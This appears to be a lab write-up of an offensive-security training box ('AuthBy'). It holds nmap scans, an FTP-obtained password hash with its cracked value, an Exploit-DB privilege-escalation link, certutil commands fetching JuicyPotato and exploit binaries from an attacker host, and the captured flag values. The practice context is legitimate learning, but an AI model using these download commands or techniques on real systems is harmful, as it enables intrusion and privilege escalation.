# Win - AuthBy

---

### Host

```bash
192.168.212.46
```

### Scan

```bash
> nmap -sV -T4 192.168.212.46
> nmap -sCV -A -Pn -O -p- 192.168.212.46 -oN tcpnmap.md
> sudo nmap -sU -Pn 192.168.212.46 --top-ports=100 --reason -oN udpnmap.md

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           zFTPServer 6.0 build 2011-10-17
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| total 9680
| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
| ----------   1 root     root           17 Aug 13  2011 StopService.bat
| ----------   1 root     root           18 Aug 13  2011 StartService.bat
| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
| dr-xr-xr-x   1 root     root          512 Feb 02 02:42 log
| ----------   1 root     root         2275 Aug 09  2011 LICENSE.htm
| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
|_dr-xr-xr-x   1 root     root          512 Aug 02 18:50 accounts
242/tcp  open  http          Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
|_http-title: 401 Authorization Required
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
| http-auth: 
| HTTP/1.1 401 Authorization Required\x0D
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
3145/tcp open  zftp-admin    zFTPServer admin
3389/tcp open  ms-wbt-server Microsoft Terminal Service
|_ssl-date: 2025-02-01T18:44:39+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=LIVDA
| Not valid before: 2024-08-01T10:50:21
|_Not valid after:  2025-01-31T10:50:21
| rdp-ntlm-info: 
|   Target_Name: LIVDA
|   NetBIOS_Domain_Name: LIVDA
|   NetBIOS_Computer_Name: LIVDA
|   DNS_Domain_Name: LIVDA
|   DNS_Computer_Name: LIVDA
|   Product_Version: 6.0.6001
|_  System_Time: 2025-02-01T18:44:34+00:00

```

---

## Walkthrough

- 21

![image.png](Win%20-%20AuthBy%2018d553bebf0f80a09fd5cb62da3759b3/image.png)

![image.png](Win%20-%20AuthBy%2018d553bebf0f80a09fd5cb62da3759b3/image%201.png)

![image.png](Win%20-%20AuthBy%2018d553bebf0f80a09fd5cb62da3759b3/image%202.png)

```bash
offsec : $apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0:elite
```

- 242

![image.png](Win%20-%20AuthBy%2018d553bebf0f80a09fd5cb62da3759b3/image%203.png)

![image.png](Win%20-%20AuthBy%2018d553bebf0f80a09fd5cb62da3759b3/image%204.png)

![image.png](Win%20-%20AuthBy%2018d553bebf0f80a09fd5cb62da3759b3/image%205.png)

![image.png](Win%20-%20AuthBy%2018d553bebf0f80a09fd5cb62da3759b3/image%206.png)

![image.png](Win%20-%20AuthBy%2018d553bebf0f80a09fd5cb62da3759b3/image%207.png)

![image.png](Win%20-%20AuthBy%2018d553bebf0f80a09fd5cb62da3759b3/image%208.png)

https://www.exploit-db.com/exploits/40564

```bash
certutil -urlcache -f http://192.168.45.170/JuicyPotato.exe C:\Users\Public\jp.exe

certutil -urlcache -f http://192.168.45.170/40564.exe C:\Users\Public\ex.exe

certutil -urlcache -f http://192.168.45.170/MS11-046.exe C:\Users\Public\MS11-046.exe
```

![image.png](Win%20-%20AuthBy%2018d553bebf0f80a09fd5cb62da3759b3/image%209.png)

![image.png](Win%20-%20AuthBy%2018d553bebf0f80a09fd5cb62da3759b3/image%2010.png)

![image.png](Win%20-%20AuthBy%2018d553bebf0f80a09fd5cb62da3759b3/image%2011.png)

```bash
- local.txt : 512791aafa4144b8184dcadc376e5825
- proof.txt : 93ea8e2cd46fce1f72ca66ead242e032
```